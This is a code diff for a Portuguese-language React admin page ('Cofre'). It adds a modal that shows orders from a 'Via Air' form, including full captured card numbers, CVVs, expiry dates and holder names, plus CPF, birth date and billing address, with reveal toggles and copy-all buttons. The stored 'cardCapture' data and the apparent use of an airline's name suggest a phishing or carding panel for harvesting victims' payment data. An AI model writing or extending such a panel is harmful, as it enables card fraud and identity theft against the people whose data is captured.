@@ -12,6 +12,11 @@ import {
   Package,
   Link2,
   RefreshCw,
+  FileText,
+  X,
+  CreditCard,
+  Eye,
+  EyeOff,
 } from "lucide-react";
 import { toast } from "sonner";
 import { formatBRL } from "@/lib/format";
@@ -51,12 +56,14 @@ type UnifiedItem = {
   adults?: number;
   children?: number;
   notes?: string | null;
+  order?: CofreOrder;
 };
 
 function CofrePage() {
   const [entries, setEntries] = useState<CofreEntry[]>([]);
   const [query, setQuery] = useState("");
   const [tab, setTab] = useState<"all" | "avulso" | "pedido">("all");
+  const [detailsItem, setDetailsItem] = useState<UnifiedItem | null>(null);
   const router = useRouter();
 
   const fetchOrders = useServerFn(listCofreOrders);
@@ -124,6 +131,7 @@ function CofrePage() {
         adults: o.adults,
         children: o.children,
         notes: o.notes,
+        order: o,
       };
     });
 
@@ -290,6 +298,15 @@ function CofrePage() {
                 >
                   <MessageCircle className="h-3.5 w-3.5" /> WhatsApp
                 </a>
+                {e.kind === "pedido" && e.order && (
+                  <button
+                    type="button"
+                    onClick={() => setDetailsItem(e)}
+                    className="inline-flex items-center gap-2 rounded-full border border-border px-3.5 py-2 text-xs hover:border-brand-orange transition"
+                  >
+                    <FileText className="h-3.5 w-3.5" /> Ver dados
+                  </button>
+                )}
                 {e.kind === "pedido" && e.orderId && (
                   <button
                     type="button"
@@ -314,6 +331,169 @@ function CofrePage() {
             </div>
           );
         })}
+      </div>
+
+      {detailsItem && detailsItem.order && (
+        <DetailsModal
+          item={detailsItem}
+          onClose={() => setDetailsItem(null)}
+        />
+      )}
+    </div>
+  );
+}
+
+function DetailsModal({
+  item,
+  onClose,
+}: {
+  item: UnifiedItem;
+  onClose: () => void;
+}) {
+  const o = item.order!;
+  const card = o.cardCapture;
+  const [showCard, setShowCard] = useState(false);
+  const [showCvv, setShowCvv] = useState(false);
+
+  const rows: Array<[string, string | null | undefined]> = [
+    ["Data e hora", new Date(o.createdAt).toLocaleString("pt-BR")],
+    ["Pedido", `#${o.id.slice(0, 8)}`],
+    ["Status", o.status],
+    ["Descrição", o.linkDescription || item.description],
+    ["Referência", o.linkReference],
+    ["Pacote", o.packageTitle],
+    ...(card
+      ? [
+          ["Bandeira", card.brand_hint || null],
+          [
+            "Número do cartão",
+            card.full_number
+              ? showCard
+                ? card.full_number
+                : `•••• •••• •••• ${card.last4 || "----"}`
+              : card.last4
+                ? `•••• •••• •••• ${card.last4}`
+                : null,
+          ],
+          ["Validade", card.expiry],
+          ["CVV", card.cvv ? (showCvv ? card.cvv : "•••") : null],
+          ["Nome como está no cartão", card.holder],
+        ] as Array<[string, string | null | undefined]>
+      : []),
+    ["CPF", o.cpf],
+    ["Nome completo", o.fullName],
+    ["Data de nascimento", o.birthDate],
+    ["Telefone", o.phone],
+    ["E-mail", o.email],
+    ["Endereço de cobrança", card?.billing?.address],
+    ["Número", card?.billing?.number],
+    ["CEP", card?.billing?.zip],
+    ["Cidade", card?.billing?.city],
+    ["Estado", card?.billing?.state],
+    ["Adultos", String(o.adults)],
+    ["Crianças", o.children ? String(o.children) : null],
+    ["Forma de pagamento", o.paymentMethod],
+    ["Observações", o.notes],
+  ];
+
+  function copyAll() {
+    const txt = rows
+      .filter(([, v]) => v)
+      .map(([k, v]) => `${k}: ${v}`)
+      .join("\n");
+    navigator.clipboard.writeText(txt);
+    toast.success("Dados copiados");
+  }
+
+  return (
+    <div
+      className="fixed inset-0 z-50 flex items-start justify-center overflow-y-auto bg-black/60 p-4 backdrop-blur-sm"
+      onClick={onClose}
+    >
+      <div
+        className="w-full max-w-2xl rounded-2xl border border-border bg-card shadow-2xl my-8"
+        onClick={(e) => e.stopPropagation()}
+      >
+        <div className="flex items-center justify-between border-b border-border px-6 py-4">
+          <div className="flex items-center gap-2">
+            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-brand-orange/15 text-brand-orange">
+              <CreditCard className="h-5 w-5" />
+            </div>
+            <div>
+              <div className="text-xs text-muted-foreground">
+                Formulário Via Air
+              </div>
+              <div className="font-semibold">Dados de pagamento</div>
+            </div>
+          </div>
+          <button
+            type="button"
+            onClick={onClose}
+            className="inline-flex h-9 w-9 items-center justify-center rounded-full border border-border hover:border-brand-orange"
+            aria-label="Fechar"
+          >
+            <X className="h-4 w-4" />
+          </button>
+        </div>
+
+        <div className="px-6 py-4 flex flex-wrap gap-2">
+          <button
+            type="button"
+            onClick={copyAll}
+            className="inline-flex items-center gap-2 rounded-full bg-gradient-brand px-3.5 py-2 text-xs font-semibold text-primary-foreground hover:opacity-90 transition"
+          >
+            <Copy className="h-3.5 w-3.5" /> Copiar tudo
+          </button>
+          {card?.full_number && (
+            <button
+              type="button"
+              onClick={() => setShowCard((v) => !v)}
+              className="inline-flex items-center gap-2 rounded-full border border-border px-3.5 py-2 text-xs hover:border-brand-orange transition"
+            >
+              {showCard ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
+              {showCard ? "Ocultar cartão" : "Mostrar cartão"}
+            </button>
+          )}
+          {card?.cvv && (
+            <button
+              type="button"
+              onClick={() => setShowCvv((v) => !v)}
+              className="inline-flex items-center gap-2 rounded-full border border-border px-3.5 py-2 text-xs hover:border-brand-orange transition"
+            >
+              {showCvv ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
+              {showCvv ? "Ocultar CVV" : "Mostrar CVV"}
+            </button>
+          )}
+        </div>
+
+        <div className="border-t border-border">
+          <dl className="divide-y divide-border">
+            {rows
+              .filter(([, v]) => v !== null && v !== undefined && v !== "")
+              .map(([k, v]) => (
+                <div key={k} className="grid grid-cols-[180px_1fr] gap-4 px-6 py-3 text-sm">
+                  <dt className="font-semibold text-muted-foreground">
+                    {k}
+                    <span className="text-brand-orange">*</span>:
+                  </dt>
+                  <dd className="break-all font-mono text-foreground">
+                    {v}
+                    <button
+                      type="button"
+                      onClick={() => {
+                        navigator.clipboard.writeText(String(v));
+                        toast.success(`${k} copiado`);
+                      }}
+                      className="ml-2 inline-flex h-6 w-6 items-center justify-center rounded text-muted-foreground hover:text-brand-orange"
+                      aria-label={`Copiar ${k}`}
+                    >
+                      <Copy className="h-3 w-3" />
+                    </button>
+                  </dd>
+                </div>
+              ))}
+          </dl>
+        </div>
       </div>
     </div>
   );
